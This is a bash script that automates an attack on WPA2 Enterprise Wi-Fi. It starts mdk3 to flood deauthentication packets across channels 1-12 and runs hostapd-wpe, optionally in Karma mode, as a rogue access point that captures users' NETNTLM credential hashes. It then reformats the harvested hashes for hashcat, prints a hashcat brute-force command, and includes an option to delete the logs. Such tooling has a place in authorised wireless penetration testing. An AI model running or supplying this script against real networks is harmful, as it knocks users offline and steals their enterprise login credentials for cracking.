#!/usr/bin/env bash

BLUE='\033[1;34m'
RED='\033[1;31m'
GREEN='\033[1;32m'
ORANGE='\033[1;33m'
NC='\033[0m'

INFO="${BLUE}[*]${NC} "
ERROR="${RED}[-]${NC} "
SUCESS="${GREEN}[+]${NC} "
WARNING="${ORANGE}[!]${NC} "

mdk3_iface="wlan1"
hostapd_iface="wlan2"
essid="test"
hostapd_conf="/etc/hostapd-wpe/hostapd-wpe.conf"
log_dir="/var/log"
deauth_channels="1,2,3,4,5,6,7,8,9,10,11,12"
whitelist_file="/root/whitelist"
hashcat_hashes_file="/tmp/netntlmv1-hashes.txt"
netntlm_hashes_file="/tmp/hostapd-wpe-hashes.txt"

start=NO
karma=NO
kill=NO
check=NO
netntlm=NO
netntlm_hashcat=NO
delete_log=NO
help=NO

function usage {
if [ -n "$1" ]
then
    echo -e $1
fi
cat << EOF
Usage: $0 [-h] [-m MDK3_IFACE] [-w HOSTAPD_WPE_IFACE] [-e ESSID]
               [-c HOSTAPD_CONF] [-l LOG_DIR] [-d DEAUTH_CHANNELS]
               [-s] [-k] [-K] [-C]

WPA2 Enterprise hack automatization script

Optional arguments:
  -h, --help            show this help message and exit
  -m MDK3_IFACE, --mdk3-iface MDK3_IFACE
                        Set wireless interface for send deauth packets
                        (default: ${mdk3_iface})
  -w HOSTAPD_WPE_IFACE, --hostapd-wpe-iface HOSTAPD_WPE_IFACE
                        Set wireless interface for hostapd-wpe
                        (default: ${hostapd_iface})
  -e ESSID, --essid ESSID
                        Set ESSID for WPA2 Enterprise AP (default: ${essid})
  -c HOSTAPD_CONF, --hostapd-conf HOSTAPD_CONF
                        Set path to conf file for hostapd-wpe
                        (default: ${hostapd_conf})
  -l LOG_DIR, --log-dir LOG_DIR
                        Set path to directory with logs (default: ${log_dir})
  -d DEAUTH_CHANNELS, --deauth-channels DEAUTH_CHANNELS
                        Set channels for deauth
                        (default: ${deauth_channels})
  -s, --start           Start mdk3 and hostapd-wpe process
  -k, --karma           Set Karma mode for hostapd-wpe
  -K, --kill            Kill mdk3 and hostapd-wpe process
  -C, --check           Check mdk3 and hostapd-wpe process
  -N, --netntlm         Print unique users with NETNTLM hashes
  -H, --netntlm-hashcat Print unique users with NETNTLM hashes (hashcat format)
  -D, --delete-log      Delete log files
EOF
}

POSITIONAL=()
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -m|--mdk3-iface)
    mdk3_iface="$2"
    shift # past argument
    shift # past value
    ;;
    -w|--hostapd-wpe-iface)
    hostapd_iface="$2"
    shift # past argument
    shift # past value
    ;;
    -e|--essid)
    essid="$2"
    shift # past argument
    shift # past value
    ;;
    -c|--hostapd-conf)
    hostapd_conf="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--log-dir)
    log_dir="$2"
    shift # past argument
    shift # past value
    ;;
    -d|--deauth-channels)
    deauth_channels="$2"
    shift # past argument
    shift # past value
    ;;
    -s|--start)
    start=YES
    shift # past argument
    ;;
    -k|--karma)
    karma=YES
    shift # past argument
    ;;
    -K|--kill)
    kill=YES
    shift # past argument
    ;;
    -C|--check)
    check=YES
    shift # past argument
    ;;
    -N|--netntlm)
    netntlm=YES
    shift # past argument
    ;;
    -H|--netntlm-hashcat)
    netntlm_hashcat=YES
    shift # past argument
    ;;
    -D|--delete-log)
    delete_log=YES
    shift # past argument
    ;;
    -h|--help)
    usage
    exit 0
    ;;
    *)    # unknown option
    usage "Unknown option: ${1}"
    exit 1
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

if [[ $netntlm == "YES" ]]
then
    cat ${log_dir}/hostapd-wpe.log | grep "jtr NETNTLM" | awk '{print $3}' | sort -u -t: -k1,1 >${netntlm_hashes_file}
    if [ -s "$netntlm_hashes_file" ]
    then
        echo -e "${SUCESS}$(wc -l $netntlm_hashes_file) unique users with NETNTLM hashes:"
        cat ${netntlm_hashes_file}
        echo -e "${INFO}Save NETNTLM hashes to file: ${netntlm_hashes_file}"
    else
        echo -e "${ERROR}Not found NETNTLM hashes in hostapd-wpe log: ${log_dir}/hostapd-wpe.log"
    fi
    exit 0
fi

if [[ $netntlm_hashcat == "YES" ]]
then
    cat ${log_dir}/hostapd-wpe.log | grep "jtr NETNTLM" | awk '{print $3}' | sort -u -t: -k1,1 | sed 's/\$NETNTLM//g' | sed 's/\$/ /g' | awk '{print $1":::"$3":"$2}' >${hashcat_hashes_file}
    if [ -s "$hashcat_hashes_file" ]
    then
        echo -e "${SUCESS}$(wc -l $hashcat_hashes_file) unique users with NETNTLM hashes (hashcat format):"
        cat ${hashcat_hashes_file}
        echo -e "${INFO}Save NETNTLM hashes (hashcat format) to file: ${hashcat_hashes_file}"
        echo -e "${INFO}Brute command: hashcat -m 5500 ${hashcat_hashes_file} password_list.txt"
    else
        echo -e "${ERROR}Not found NETNTLM hashes in hostapd-wpe log: ${log_dir}/hostapd-wpe.log"
        rm -f ${hashcat_hashes_file}
    fi
    exit 0
fi

if [[ $delete_log == "YES" ]]
then
    echo -e "${INFO}Delete log files ..."
    rm -f ${log_dir}/hostapd-wpe.log
    rm -f ${log_dir}/death.log
    rm -f ${whitelist_file}
    rm -f ${netntlm_hashes_file}
    rm -f ${hashcat_hashes_file}
    exit 0
fi

if [[ $check == "YES" ]]
then
    echo -e "${INFO}Check hostapd_wpe and mdk3 ..."

    if [[ $(pgrep hostapd-wpe) ]]
    then
        echo -e "${SUCESS}hostapd-wpe is working:"
        ps h | grep hostapd-wpe | grep -v grep
    else
        echo -e "${ERROR}hostapd-wpe is not working! Log: ${log_dir}/hostapd-wpe.log"
    fi

    if [[ $(pgrep mdk3) ]]
    then
        echo -e "${SUCESS}mdk3 is working:"
        ps h | grep mdk3 | grep -v grep
    else
        echo -e "${ERROR}mdk3 is not working! Log: ${log_dir}/deauth.log"
    fi

    exit 0
fi

if [[ $kill == "YES" ]]
then
    echo -e "${INFO}Kill hostapd_wpe and mdk3 ..."
    kill -9 `pgrep mdk3` >/dev/null 2>&1
    kill -9 `pgrep hostapd-wpe` >/dev/null 2>&1
    rm -f ${whitelist_file}
    rm -f ${netntlm_hashes_file}
    rm -f ${hashcat_hashes_file}
    exit 0
fi

hostapd_iface_mac=$(ip link show dev ${hostapd_iface} | grep 'link' | awk '{print $2}')
mdk3_iface_mac=$(ip link show dev ${mdk3_iface} | grep 'link' | awk '{print $2}')

echo -e "${INFO}hostapd_wpe interface: ${BLUE}${hostapd_iface}${NC}"
echo -e "${INFO}hostapd_wpe interface mac: ${BLUE}${hostapd_iface_mac}${NC}"
echo -e "${INFO}hostapd_wpe conf file: ${BLUE}${hostapd_conf}${NC}"
echo -e "${INFO}AP ESSID: ${BLUE}${essid}${NC}"
echo -e "${INFO}mdk3 interface: ${BLUE}${mdk3_iface}${NC}"
echo -e "${INFO}mdk3 interface mac: ${BLUE}${mdk3_iface_mac}${NC}"

hostapd_iface_status=$(iwconfig $hostapd_iface 2>&1 | grep -cs 'No such device')
if [[ $hostapd_iface_status == 1 ]]
then
    echo -e "${ERROR}Device for hostapd-wpe: ${hostapd_iface} not found!"
    exit 1
fi

mdk3_iface_status=$(iwconfig $mdk3_iface 2>&1 | grep -cs 'No such device')
if [[ $mdk3_iface_status == 1 ]]
then
    echo -e "${ERROR}Device for mdk3: ${hostapd_iface} not found!"
    exit 1
fi

echo -e "${INFO}Switch mdk3 interface: ${BLUE}${mdk3_iface}${NC} to Monitor mode ..."
ifconfig ${mdk3_iface} down && iwconfig ${mdk3_iface} mode monitor && ifconfig ${mdk3_iface} up

mdk3_iface_status=$(iwconfig $mdk3_iface 2>&1 | grep -cs 'Mode:Monitor')
if [[ $mdk3_iface_status == 1 ]]
then
    echo -e "${SUCESS}Device for mdk3: ${BLUE}${mdk3_iface}${NC} successfully switched to Monitor mode!"
else
    echo -e "${ERROR}Device for mdk3: ${BLUE}${mdk3_iface}${NC} not switched to Monitor mode!"
    exit 1
fi

echo -e "${INFO}Changing hostapd_wpe config file: ${BLUE}${hostapd_conf}${NC} ..."
sed -i -e 's/interface=.*$/interface='${hostapd_iface}'/g' ${hostapd_conf}
sed -i -e 's/ssid=.*$/ssid='${essid}'/g' ${hostapd_conf}

echo -e "${INFO}Write hostapd_wpe interface mac (${hostapd_iface_mac}) to whitelist file: ${whitelist_file}"
echo ${hostapd_iface_mac} > ${whitelist_file}

if [[ $start == "YES" ]]
then
    echo -e "${INFO}Start hostapd_wpe and mdk3 ..."
    echo -e "${INFO}airmon-ng check kill ..."

    /usr/sbin/airmon-ng check kill >/dev/null 2>&1

    if [[ $karma == "YES" ]]
    then
        /usr/sbin/hostapd-wpe -k ${hostapd_conf} >> ${log_dir}/hostapd-wpe.log 2>&1 &
    else
        /usr/sbin/hostapd-wpe ${hostapd_conf} >> ${log_dir}/hostapd-wpe.log 2>&1 &
    fi

    /usr/sbin/mdk3 ${mdk3_iface} d -w ${whitelist_file} -c ${deauth_channels} >> ${log_dir}/deauth.log 2>&1 &
    sleep 3

    if [[ $(pgrep hostapd-wpe) ]]
    then
        echo -e "${SUCESS}hostapd-wpe process: "
        ps h | grep hostapd-wpe | grep -v grep
    else
        echo -e "${ERROR}Can not start hostapd-wpe! Log: ${log_dir}/hostapd-wpe.log"
        $0 -K
        exit 1
    fi

    if [[ $(pgrep mdk3) ]]
    then
        echo -e "${SUCESS}mdk3 process: "
        ps h | grep mdk3 | grep -v grep
    else
        echo -e "${ERROR}Can not start mdk3! Log: ${log_dir}/deauth.log"
        $0 -K
        exit 1
    fi

fi
